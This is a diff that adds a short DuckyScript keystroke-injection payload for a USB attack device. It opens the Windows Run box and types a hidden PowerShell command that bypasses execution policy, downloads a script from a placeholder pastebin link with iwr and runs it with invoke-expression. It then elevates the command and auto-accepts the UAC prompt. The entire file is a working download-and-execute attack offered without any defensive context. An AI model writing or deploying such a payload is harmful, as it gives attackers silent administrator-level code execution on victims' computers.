@@ -1,0 +1,7 @@
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell -w h -NoP -NonI -Exec Bypass $pl = iwr <pastebin to ps1 script>?dl=1; invoke-expression $pl
+CTRL-SHIFT ENTER
+DELAY 1000
+ALT y
